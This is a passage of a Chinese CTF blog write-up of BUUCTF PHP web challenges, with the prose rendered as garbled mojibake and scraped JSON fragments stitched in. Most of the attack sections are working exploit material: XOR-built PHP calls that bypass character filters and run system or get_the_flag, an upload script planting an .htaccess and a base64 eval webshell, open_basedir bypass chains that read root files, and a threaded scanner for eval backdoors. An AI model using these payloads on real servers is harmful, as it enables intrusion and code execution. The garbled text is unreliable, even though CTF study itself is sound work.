shellçš„æ–¹æ³•ï¼š1ã€åˆ©ç”¨å¼‚æˆ–åœ¨PHPä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦ä¸²æ‰§è¡Œå¼‚æˆ–æ“ä½œä»¥åï¼Œå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬æƒ³å¾—åˆ°a-zä¸­æŸä¸ªå­—æ¯ï¼Œå°±æ‰¾åˆ°æŸä¸¤ä¸ªéå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ï¼Œä»–ä»¬çš„å¼‚æˆ–ç»“æœæ˜¯è¿™ä¸ªå­—æ¯å³å¯ã€‚åœ¨PHPä¸­ï¼Œä¸¤ä¸ªå˜é‡è¿›è¡Œå¼‚æˆ–æ—¶ï¼Œå…ˆä¼šå°†å­—ç¬¦ä¸²è½¬æ¢æˆASCIIå€¼ï¼Œå†å°†ASCIIå€¼è½¬æ¢æˆäºŒè¿›åˆ¶å†è¿›è¡Œå¼‚æˆ–ï¼Œå¼‚æˆ–ä¹‹åï¼Œåˆå°†ç»“æœä»äºŒè¿›åˆ¶è½¬æ¢æˆäº†ASCIIå€¼ï¼Œå†å°†ASCIIå€¼è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚å¼‚æˆ–æ“ä½œæœ‰æ—¶ä¹Ÿè¢«ç”¨æ¥äº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼ã€‚è¿™é‡Œé™„ä¸Šä¸€ä¸ªç½‘ä¸Šçœ‹åˆ°çš„ä»£ç ï¼š &lt;?php$l = \"\";$r = \"\";$argv = str_split(\"_GET\");for($i=0;$i&lt;count($argv);$i++){ for($j=0;$j&lt;255;$j++) { $k = chr($j)^chr(255); \\\\dechex(255) = ff if($k == $argv[$i]){ if($j&lt;16){ $l .= \"%ff\"; $r .= \"%0\" . dechex($j); continue; } $l .= \"%ff\"; $r .= \"%\" . dechex($j); continue; } }}echo \"\\{$l`$r\\}\";?&gt; ç„¶åé…åˆä¸‹é¢çš„payloadï¼Œå¯ä»¥æ‰§è¡Œä¸€äº›å‡½æ•°ã€‚ ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;ff=phpinfo æŠ›å¼€è¿™é“é¢˜ï¼Œè¿˜å¯ä»¥ç±»ä¼¼è¿™æ ·åœ°ä½¿ç”¨ï¼š http://127.0.0.1/?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(\"type index.php\");&amp;%ff=systemã€‚ æœ€åçš„exp: $a = (%9e ^ %ff).(%8c ^ %ff).(%8c ^ %ff).(%9a ^ %ff).(%8d ^ %ff).(%8b ^ %ff);\\\\assert$b = \"_\" . (%af ^ %ff).(%b0 ^ %ff).(%ac ^ %ff).(%ab ^ %ff);$c = $$b;\\\\$b = $_POST$a($c[777]); 2ã€å–åæ„é€ ä¸æ–¹æ³•1æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼Œå”¯ä¸€å·®å¼‚å°±æ˜¯ï¼Œæ–¹æ³•1ä½¿ç”¨çš„æ˜¯ä½è¿ç®—é‡Œçš„å¼‚æˆ–ï¼Œæœ¬æ–¹æ³•ä½¿ç”¨çš„æ˜¯ä½è¿ç®—é‡Œçš„å–åã€‚æœ¬æ–¹æ³•åˆ©ç”¨çš„æ˜¯UTF-8ç¼–ç çš„æŸä¸ªæ±‰å­—ï¼Œå¹¶å°†å…¶ä¸­æŸä¸ªå­—ç¬¦å–å‡ºæ¥ï¼Œæ¯”å¦‚'å’Œ'{2}çš„ç»“æœæ˜¯\\x8cï¼Œå…¶å–åå³ä¸ºå­—æ¯sï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–çš„å¦‚ä¸‹å›¾ï¼šå›¾ç‰‡æ¥æºäºPç¥çš„é‚£ç¯‡æ–‡ç« ã€‚å½“ç„¶ï¼Œåœ¨è¿™é“é¢˜é‡Œå·²ç»è¿‡æ»¤äº†æ•°å­—ï¼Œé‚£æ€ä¹ˆæ¥æ„é€ {}ä¸­çš„æ•°å­—å‘¢ï¼Ÿè¿™ä¸ªå¯ä»¥åˆ©ç”¨PHPçš„å¼±ç±»å‹ç‰¹æ€§ï¼štrueçš„å€¼ä¸º1ï¼Œæ•…true+true==2ï¼Œä¹Ÿå°±æ˜¯('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;')==2ã€‚ç„¶åä¾¿å¯ä»¥ä¸€æ­¥ä¸€æ­¥æ„é€ å³å¯ã€‚åé¢æœ‰ä¸€ç¯‡åšå®¢é‡Œ[SUCTF 2018]GetShellè¿™é“é¢˜ç”¨åˆ°äº†è¿™ä¸ªçŸ¥è¯†ç‚¹ã€‚3ã€è‡ªå¢æ„é€ å‚è€ƒhttp://php.net/manual/zh/language.operators.increment.phpå¯ä»¥äº†è§£åˆ°'a'++ =&gt; 'b'ï¼Œ'b'++ =&gt; 'c'â€¦ æ‰€ä»¥ï¼Œæˆ‘ä»¬åªè¦èƒ½æ‹¿åˆ°ä¸€ä¸ªå˜é‡ï¼Œå…¶å€¼ä¸ºaï¼Œé€šè¿‡è‡ªå¢æ“ä½œå³å¯è·å¾—a-zä¸­æ‰€æœ‰å­—ç¬¦ã€‚é‚£å¦‚ä½•è·å–aå‘¢ï¼Ÿæ•°ç»„Arrayçš„ç¬¬ä¸€ä¸ªå­—æ¯å°±æ˜¯å¤§å†™Aï¼Œè€Œä¸”ç¬¬4ä¸ªå­—æ¯æ˜¯å°å†™aã€‚åˆ©ç”¨å®ƒå¯ä»¥åŒæ—¶æ‹¿åˆ°aå’ŒAï¼Œç­‰äºæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°a-zå’ŒA-Zçš„æ‰€æœ‰å­—æ¯äº†ã€‚åœ¨PHPä¸­ï¼Œå¦‚æœå¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå…¶å€¼ä¸ºArrayï¼Œç„¶åå†å–è¿™ä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å°±æ˜¯Aäº†ï¼ŒåŒç†è·å–aã€‚è¿˜å¯ä»¥åˆ©ç”¨ä¸‹é¢çš„æ–¹å¼æ¥è·å–ï¼š &lt;?php function B(){ echo \"HI!\"; } $_++; $__= \"?\" ^ \"}\"; $__();? 1ã€$_++;è¿™è¡Œä»£ç çš„æ„æ€æ˜¯å¯¹å˜é‡åä¸º_çš„å˜é‡è¿›è¡Œè‡ªå¢æ“ä½œï¼Œåœ¨PHPä¸­æœªå®šä¹‰çš„å˜é‡é»˜è®¤å€¼ä¸ºnullï¼Œnull==false==0ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸ä½¿ç”¨ä»»ä½•æ•°å­—çš„æƒ…å†µä¸‹,é€šè¿‡å¯¹æœªå®šä¹‰å˜é‡çš„è‡ªå¢æ“ä½œæ¥å¾—åˆ°ä¸€ä¸ªæ•°å­—ï¼›2ã€$__=&quot;?&quot; ^ &quot;}&quot;;å¯¹å­—ç¬¦?å’Œ}è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå¾—åˆ°ç»“æœBèµ‹ç»™å˜é‡åä¸º__çš„å˜é‡ï¼›3ã€$__();é€šè¿‡ä¸Šé¢çš„èµ‹å€¼æ“ä½œï¼Œå˜é‡$__çš„å€¼ä¸ºBï¼Œæ‰€ä»¥è¿™è¡Œå¯ä»¥çœ‹ä½œæ˜¯B(),åœ¨PHPä¸­,è¿™è¡Œä»£ç è¡¨ç¤ºè°ƒç”¨å‡½æ•°B,æ‰€ä»¥æ‰§è¡Œç»“æœä¸ºHI!,åœ¨PHPä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°†å­—ç¬¦ä¸²å½“ä½œå‡½æ•°æ¥å¤„ç†ã€‚ æƒ³è¦æ›´æ·±çš„äº†è§£ï¼Œå‚è€ƒå‰é¢çš„é“¾æ¥ã€‚ æ–‡ä»¶ä¸Šä¼ ç»•è¿‡å…³äºè§£æä¹‹å‰è®²è¿‡ä¸€ä¸ªå€Ÿç”¨.user.iniè§£ææ¥ä¸Šä¼ å°é©¬çš„ï¼Œè¿™é‡Œå†æ‰©å±•ä¸€ä¸‹ï¼š nginxçš„æœåŠ¡å™¨ï¼Œè€Œä¸”ä¸Šä¼ ç›®å½•ä¸‹æœ‰ä¸€ä¸ªphpæ–‡ä»¶ï¼Œæ‰€ä»¥ä¸Šä¼ .user.iniapacheçš„æœåŠ¡å™¨ï¼Œåº”è¯¥ä¸Šä¼ .htaccess .user.iniçš„å·²ç»è®²è¿‡äº†ï¼Œè¿™é‡Œè®²ä¸€ä¸‹.htaccessï¼šä¸Šä¼ çš„æ—¶å€™ä¸èƒ½ç”¨GIF89aç­‰æ–‡ä»¶å¤´å»ç»•è¿‡exif_imagetype,å› ä¸ºè¿™æ ·è™½ç„¶èƒ½ä¸Šä¼ æˆåŠŸï¼Œä½†.htaccessæ–‡ä»¶æ— æ³•ç”Ÿæ•ˆã€‚è¿™æ—¶æœ‰ä¸¤ä¸ªåŠæ³•: #define width 1337#define height 1337 #åœ¨.htaccessæ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥.htaccessæ–‡ä»¶å¯ä»¥ç”Ÿæ•ˆã€‚åŒæ—¶åœ¨.htaccesså‰æ·»åŠ x00x00x8ax39x8ax39(è¦åœ¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ä¸­æ·»åŠ ï¼Œæˆ–è€…ä½¿ç”¨pythonçš„bytesç±»å‹)ï¼Œè¿™é‡Œx00x00x8ax39x8ax39æ˜¯wbmpæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œ.htaccessä¸­ä»¥0x00å¼€å¤´çš„åŒæ ·ä¹Ÿæ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥ä¸ä¼šå½±å“.htaccessã€‚å¯¹&lt;?è¿‡æ»¤çš„ç»•è¿‡å¯¹&lt;?ç»•è¿‡çš„ä¸€èˆ¬å¯ä»¥å€Ÿç”¨&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;æ¥ç»•è¿‡ï¼Œä½†æ˜¯å½“PHPçš„ç‰ˆæœ¬æ˜¯7ä»¥ä¸Šçš„æ—¶å€™ï¼Œæœ¬æ–¹æ³•ä¸å¯ç”¨äº†ï¼Œæ­¤æ—¶éœ€è¦ç”¨å¦ä¸€ç§æ–¹æ³•ï¼šå¯ä»¥é€šè¿‡ç¼–ç è¿›è¡Œç»•è¿‡ï¼Œå¦‚åŸæ¥ä½¿ç”¨utf-8ç¼–ç ï¼Œå¦‚æœshellä¸­æ˜¯ç”¨utf-16ç¼–ç åˆ™å¯ä»¥Bypassã€‚åœ¨æœ¬é¢˜ä¸­çš„ç”¨æ³•åé¢å†è®²ã€‚ ç»•è¿‡open_basedir/disable_functionopen_basediræ˜¯php.iniä¸­çš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œå®ƒå¯å°†ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æ´»åŠ¨èŒƒå›´é™åˆ¶åœ¨æŒ‡å®šçš„åŒºåŸŸã€‚å‡è®¾open_basedir=/home/wwwroot/home/web1/:/tmp/ï¼Œé‚£ä¹ˆé€šè¿‡web1è®¿é—®æœåŠ¡å™¨çš„ç”¨æˆ·å°±æ— æ³•è·å–æœåŠ¡å™¨ä¸Šé™¤äº†/home/wwwroot/home/web1/å’Œ/tmp/è¿™ä¸¤ä¸ªç›®å½•ä»¥å¤–çš„æ–‡ä»¶ã€‚æ³¨æ„ç”¨open_basediræŒ‡å®šçš„é™åˆ¶å®é™…ä¸Šæ˜¯å‰ç¼€ï¼Œè€Œä¸æ˜¯ç›®å½•åã€‚ä¸¾ä¾‹æ¥è¯´: è‹¥open_basedir = /dir/user, é‚£ä¹ˆç›®å½•/dir/userå’Œ/dir/user1éƒ½æ˜¯å¯ä»¥è®¿é—®çš„ï¼Œæ‰€ä»¥å¦‚æœè¦å°†è®¿é—®é™åˆ¶åœ¨ä»…ä¸ºæŒ‡å®šçš„ç›®å½•ï¼Œæ³¨æ„ç”¨æ–œçº¿ç»“æŸè·¯å¾„åã€‚æ›´å¤šçš„å¯ä»¥å‚è€ƒè¿™é‡Œã€‚ è§£é¢˜è¿›å…¥é¢˜ç›®çœ‹åˆ°æºç ï¼š &lt;?phpfunction get_the_flag(){ // webadmin will remove your upload file every 20 min!!!! $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']); if(!file_exists($userdir)){ mkdir($userdir); } if(!empty($_FILES[\"file\"])){ $tmp_name = $_FILES[\"file\"][\"tmp_name\"]; $name = $_FILES[\"file\"][\"name\"]; $extension = substr($name, strrpos($name,\".\")+1); if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die(\"^_^\"); if(!exif_imagetype($tmp_name)) die(\"^_^\"); $path= $userdir.\"/\".$name; @move_uploaded_file($tmp_name, $path); print_r($path); }}$hhh = @$_GET['_'];if (!$hhh){ highlight_file(__FILE__);}if(strlen($hhh)&gt;18){ die('One inch long, one inch strong!');}if ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&amp;.,|=[\\x7F]+/i', $hhh) ) die('Try something else!');$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(\"Almost there!\");eval($hhh);?&gt; å¯ä»¥çœ‹åˆ°ï¼Œä»£ç ä¸»è¦åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šget_the_flag()å’Œå„ç§è¿‡æ»¤çš„ä»£ç (ä¸»è¦æ˜¯ä¸ºäº†è°ƒç”¨get_the_flag())ã€‚å¯ä»¥åˆ©ç”¨ä¸‹é¢çš„ä»£ç fuzzä¸€ä¸‹ï¼š for ($i = 0; $i &lt; 256; $i++) { if (!preg_match('/[x00- 0-9A-Za-z'\"`~_&amp;.,|=[x7F]+/i', chr($i))) { echo urlencode(chr($i)).' '; }}?&gt; è·å–åˆ°æ²¡æœ‰è¢«bançš„å­—ç¬¦ï¼š ! # $ % ( ) * + - / : ; &lt; &gt; ? @ ] ^ { } å‚è€ƒå‰é¢è®²çš„æ‹¿webshellçš„ä¸‰ç§æ–¹æ³•ï¼Œè¿™é‡Œå–åç¬¦å·~ç›´æ¥è¢«ç¦æ‰äº†ï¼Œè‡ªå¢éœ€è¦ç”¨åˆ°å˜é‡é•¿åº¦ä¼šå¾ˆé•¿,å› æ­¤å°è¯•ä½¿ç”¨å¼‚æˆ–ï¼Œå› ä¸ºæœ‰é•¿åº¦çš„é™åˆ¶ï¼Œæ‰€ä»¥å¯ä»¥å»å‡‘å‡ºç±»ä¼¼$_GET{x}();ç„¶åä¼ å…¥x=get_the_flagè°ƒç”¨å‡½æ•°ã€‚åˆ©ç”¨ä¸‹é¢çš„è„šæœ¬æ¥æ„é€ ï¼š import urllib.parsefind = ['G','E','T','_']for i in range(1,256): for j in range(1,256): result = chr(i^j) if(result in find): a = i.to_bytes(1,byteorder='big') b = j.to_bytes(1,byteorder='big') a = urllib.parse.quote(a) b = urllib.parse.quote(b) print(\"%s:%s^%s\"%(result,a,b)) æ‹¿åˆ°payloadï¼š ?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&amp;%fe=get_the_flag å†çœ‹get_the_flagçš„ä»£ç ï¼Œå‘ç°æ˜¯ä¸€ä¸ªä¸Šä¼ ï¼Œä»ä»£ç å¯ä»¥çœ‹å‡ºï¼Œå¯¹phã€&lt;?ã€æ–‡ä»¶çš„ç±»å‹éƒ½åšäº†åˆ¤æ–­ã€‚é‚£åªèƒ½ä¸Šä¼ å›¾ç‰‡é©¬äº†ï¼Œä½†æ˜¯è¿˜éœ€è¦ä¸Šä¼ è§£æå›¾ç‰‡é©¬çš„æ–‡ä»¶ï¼Œè¯¥é¢˜çš„ç¯å¢ƒæ˜¯apacheï¼Œå› æ­¤éœ€è¦ä¸Šä¼ .htaccessï¼Œæ„é€ çš„æ–¹æ³•å‰é¢ä¹Ÿè®²è¿‡äº†ã€‚ç°åœ¨è®²ä¸€ä¸‹.htaccessæ„é€ çš„å†…å®¹ï¼Œè¿™é‡Œå°†ä¸€å¥è¯è¿›è¡Œbase64ç¼–ç ï¼Œç„¶ååœ¨.htaccessä¸­åˆ©ç”¨phpä¼ªåè®®è¿›è¡Œè§£ç ï¼Œå†…å®¹å¦‚ä¸‹ï¼š #define width 1337#define height 1337 AddType application/x-httpd-php .jpgphp_value auto_append_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.jpg\" shell.jpgå†…å®¹ï¼š GIF89a12PD9waHAgZXZhbCgkX0dFVFsnYyddKTs/Pg== å‚è€ƒå¤§ä½¬çš„ä¸€ä¸ªå®Œæ•´çš„ä¸Šä¼ è„šæœ¬ï¼š import requestsimport base64htaccess = b\"\"\"#define width 1337#define height 1337 AddType application/x-httpd-php .jpgphp_value auto_append_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.jpg\"\"\"\"shell = b\"GIF89a12\" + base64.b64encode(b\"&lt;?php eval($_REQUEST['a']);?&gt;\")url = \"http://300a73e6-9981-40dd-b39a-cdf1584e3ba2.node3.buuoj.cn/?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&amp;%fe=get_the_flag\"files = {'file':('.htaccess',htaccess,'image/jpeg')}data = {\"upload\":\"Submit\"}response = requests.post(url=url, data=data, files=files)print(response.text)files = {'file':('shell.abc',shell,'image/jpeg')}response = requests.post(url=url, data=data, files=files)print(response.text) ç„¶åè®¿é—®?a=phpinfo();å‘ç°å­˜åœ¨open_basedirå’Œdisable_functionsçš„é™åˆ¶ï¼Œå‚è€ƒå‰é¢è®²åˆ°çš„çŸ¥è¯†ï¼Œæ„é€ æœ€ç»ˆpayloadï¼š ?a=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/')); æ‰¾åˆ°flagæ–‡ä»¶THis_Is_tHe_F14gï¼Œç„¶åæ„é€ payloadæ‹¿flagï¼š ?a=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/THis_Is_tHe_F14g')); å¶ç„¶å‘ç°ï¼Œå…¶å®è¿™ä¸ªé¢˜ä¸å»ç»•è¿‡open_basedirå’Œdisable_functionsçš„é™åˆ¶ï¼Œç›´æ¥è®¿é—®phpinfo()å°±æœ‰flagâ€¦","link":"/2020/02/10/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A1/"},{"title":"BUUCTF-webåˆ·é¢˜â… ","text":"åœ¨å®¶åœˆç€ï¼Œæœ‰æ—¶é—´å¯ä»¥å¥½å¥½åˆ·åˆ·é¢˜äº†ï¼Œçœ‹glzjinå¤„å¤„æ‰“å¹¿å‘Šï¼Œæ—©å°±æƒ³æŠŠBUUçš„é¢˜å¥½å¥½åˆ·åˆ·äº†ï¼Œä»ç°åœ¨å¼€å§‹å§ï¼ [å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢é¢˜ç›®åˆ†æè¿›å…¥é“¾æ¥ä¹‹åæ˜¯ä¸‹å›¾çš„é¡µé¢ï¼šæç¤ºæˆ‘ä»¬æºç åœ¨www.tar.gzä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠæºç ä¸‹è½½ä¸‹æ¥è¿›è¡Œå®¡è®¡ã€‚å‘ç°æ˜¯è¿™ä¸ªå‹ç¼©åŒ…åŒ…å«äº†å‡ åƒä¸ªphpæ–‡ä»¶ï¼Œå¹¶ä¸”æ¯ä¸ªæ–‡ä»¶é‡Œä»£ç éƒ½ä¸å°‘ï¼Œå‚æ•°ä¹Ÿéƒ½æ˜¯ä¹±åºå­—æ¯ï¼Œåƒæ˜¯ç»è¿‡åŠ å¯†çš„ä¸€æ ·â€¦ä½†æ˜¯ï¼Œç»è¿‡å®¡è®¡ä»£ç ï¼Œæˆ‘ä»¬å‘ç°ï¼Œå¾ˆå¤šæ–‡ä»¶ä¸­éƒ½åŒ…å«äº†ä¸å°‘çš„GETå’ŒPOSTæ–¹å¼è¿›è¡Œä¼ å‚çš„ä»£ç ï¼Œå¹¶ä¸”è¿˜æœ‰å¾ˆå¤šè°ƒç”¨evalçš„åœ°æ–¹ï¼Œè¿™ä¸å°±æ˜¯åé—¨å˜›ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•ï¼Œåœ¨evalè°ƒç”¨çš„å‚æ•°ä¸­ä¼ å…¥å‘½ä»¤æ²¡æœ‰æ•ˆæœâ€¦è¿™ä¹ˆå¤šæ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶åˆæ˜¯è¿™ä¹ˆå¤šå‚æ•°å’Œevalçš„è°ƒç”¨ï¼ŒçŒœæµ‹æ˜¯åœ¨æŸä¸ªæ–‡ä»¶ä¸­åŒ…å«å¯ä»¥æˆåŠŸæ‹¿åˆ°shellçš„å‚æ•°å’Œevalè°ƒç”¨ï¼Œè¿™ä¹ˆå¤šæ–‡ä»¶ï¼Œåªå¥½å†™è„šæœ¬è¿›è¡Œæµ‹è¯•ï¼Œæ¥æ‰¾åˆ°å­˜åœ¨åé—¨çš„æ–‡ä»¶äº†ã€‚ è§£é¢˜è„šæœ¬è¿™é‡Œå‚è€ƒä¸€ä¸ªå·¥ä½œæ•ˆç‡æ¯”è¾ƒé«˜çš„è„šæœ¬ï¼š import osimport requestsimport reimport threadingimport timeprint('å¼€å§‹æ—¶é—´ï¼š '+ time.asctime(time.localtime(time.time())))s1 = threading.Semaphore(100) #ä¿¡å·é‡ï¼Œè®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°filePath = r\"F:/phpStudy_64/phpstudy_pro/WWW/src/\"os.chdir(filePath) #æ”¹å˜å½“å‰çš„è·¯å¾„requests.adapters.DEFAULT_RETRIES = 5 #è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥files = os.listdir(filePath)session = requests.Session()session.keep_alive = False # è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalsedef get_content(file): s1.acquire() #æ¯å½“è°ƒç”¨acquire()æ—¶å†…ç½®è®¡æ•°å™¨-1 print('trying '+file+' '+time.asctime(time.localtime(time.time()))) with open(file,encoding='utf-8') as f: #æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•° gets = list(re.findall('\\$_GET\\[\\'(.*?)\\'\\]', f.read())) posts = list(re.findall('\\$_POST\\[\\'(.*?)\\'\\]', f.read())) data = {} #æ‰€æœ‰çš„$_POST params = {} #æ‰€æœ‰çš„$_GET for m in gets: params[m] = \"echo 'xxxxxx';\" for n in posts: data[n] = \"echo 'xxxxxx';\" url = 'http://127.0.0.1/src/'+file req = session.post(url, data=data, params=params) #ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST req.close() # å…³é—­è¯·æ±‚,é‡Šæ”¾å†…å­˜ req.encoding = 'utf-8' content = req.text #print(content) if \"xxxxxx\" in content: #å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•° flag = 0 for a in gets: req = session.get(url+'?%s='%a+\"echo 'xxxxxx';\") content = req.text req.close() # å…³é—­è¯·æ±‚,é‡Šæ”¾å†…å­˜ if \"xxxxxx\" in content: flag = 1 break if flag != 1: for b in posts: req = session.post(url, data={b:\"echo 'xxxxxx';\"}) content = req.text req.close() # å…³é—­è¯·æ±‚ é‡Šæ”¾å†…å­˜ if \"xxxxxx\" in content: break if flag == 1: #flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag==1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ param = a else: param = b print('æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š '+file+\" and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s\" %param) print('ç»“æŸæ—¶é—´ï¼š ' + time.asctime(time.localtime(time.time()))) s1.release()for i in files: #åŠ å…¥å¤šçº¿ç¨‹ t = threading.Thread(target=get_content, args=(i,)) t.start() è¿™ä¸ªè„šæœ¬ä¼šè¾“å‡ºå­˜åœ¨åé—¨çš„æ–‡ä»¶åå’Œå¯ä»¥æ‹¿åˆ°shellçš„å‚æ•°ï¼Œæˆ‘ä»¬æ‹¿åˆ°å‚æ•°ä¹‹åï¼Œå†ä¼ å‚ï¼Œurlå‚æ•°å†…å®¹ä¸ºcat /flagå³å¯æ‹¿åˆ°flagã€‚ [SUCTF 2019]CheckIné¢˜ç›®åˆ†ææ‰“å¼€é“¾æ¥ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¡µé¢ï¼Œç¬¬ä¸€ååº”ä¸Šä¼ å›¾ç‰‡é©¬ç»“æœæ˜¾ç¤º&lt;? in contents!è¿™æç¤ºæˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡é©¬ä¸­ä¸èƒ½åŒ…å«&lt;?ï¼ŒåŒæ—¶ä¹Ÿå¾—çŸ¥æ˜¯é»‘åå•è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨&lt;script language='php'&gt;&lt;scirpt&gt;ç±»å‹çš„å›¾ç‰‡é©¬æ¥ç»•è¿‡è¿‡æ»¤ï¼Œå’ŒNCTFä¸­çš„ä¸€é“é¢˜æ˜¯ä¸€æ ·çš„çŸ¥è¯†ç‚¹ã€‚æˆ‘ä»¬æ„é€ è¿™ç§å›¾ç‰‡é©¬ä¸Šä¼ ï¼Œå›æ˜¾å¦‚ä¸‹ï¼šæç¤ºexif_imagetype:not image!ï¼ŒçŒœæµ‹åç«¯åº”è¯¥è°ƒç”¨äº†phpçš„exif_imagetype()å‡½æ•°ï¼Œè¿™ä¸ªåœ¨å›¾ç‰‡é©¬ä¸­æ·»åŠ å›¾ç‰‡æ–‡ä»¶å¤´å°±å¯ä»¥ç»•è¿‡ï¼Œè¿™é‡Œæ·»åŠ GIF89aæ¥ç»•è¿‡ï¼Œä¸Šä¼ ä¹‹åå›æ˜¾å¦‚ä¸‹ï¼šæˆ‘ä»¬çœ‹åˆ°ï¼Œæ–‡ä»¶æˆåŠŸä¸Šä¼ ï¼Œä½†æ˜¯ç°åœ¨ç”¨èšå‰‘é“¾æ¥çš„è¯ï¼Œè¿˜æ˜¯å¤±è´¥ï¼Œå› ä¸ºä¼ ä¸Šå»çš„å¸¦å›¾ç‰‡æ–‡ä»¶å¤´çš„å›¾ç‰‡é©¬å¹¶æ²¡æœ‰è¢«è§£æï¼Œå› æ­¤éœ€è¦ä¸Šä¼ .htaccessæ–‡ä»¶æˆ–è€….user.iniæ–‡ä»¶æ¥è§£æå›¾ç‰‡é©¬ã€‚è¿™é‡ŒæœåŠ¡å™¨ç‰ˆæœ¬æ¯”è¾ƒé«˜ä¸èƒ½ç”¨.htaccessæ¥è§£æï¼Œé‚£ä¹ˆä¾¿éœ€è¦ç”¨.user.iniæ¥è§£ææˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡é©¬ã€‚ .user.iniè¿™æ˜¯ä¸€ä¸ªä¸phpé…ç½®ç›¸å…³çš„æ–‡ä»¶ï¼Œå¯ä»¥åœ¨phpæ‰‹å†ŒæŸ¥çœ‹å¯¹å…¶çš„æè¿°ï¼šä»å®˜æ–¹æè¿°ä¸­æˆ‘ä»¬çœ‹åˆ°.user.iniå¯ä»¥æ”¯æŒç”¨æˆ·é…ç½®php.iniä¸­çš„PHP_INI_PERDIRå’ŒPHP_INI_USERï¼Œåªè¦æ˜¯åœ¨CGI/FastCGIæ¨¡å¼çš„æœåŠ¡å™¨ä¸Šéƒ½æ”¯æŒ.user.iniã€‚åŒæ—¶æˆ‘ä»¬åœ¨å®˜æ–¹æ‰‹å†Œå…³äºphp.inié…ç½®é€‰é¡¹åˆ—è¡¨çš„æè¿°ä¸­çœ‹åˆ°auto_append_fileå’Œauto_prepend_fileéƒ½é€‚ç”¨åœ¨PHP_INI_PERDIRä¸­ï¼Œå³å¯ä»¥é€šè¿‡.user.iniæ¥é…ç½®å®ƒä»¬ã€‚æˆ‘ä»¬éœ€è¦çŸ¥é“è¿™ä¸¤ä¸ªé…ç½®çš„ä½œç”¨ï¼š 1ã€auto_append_fileï¼šæŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚ 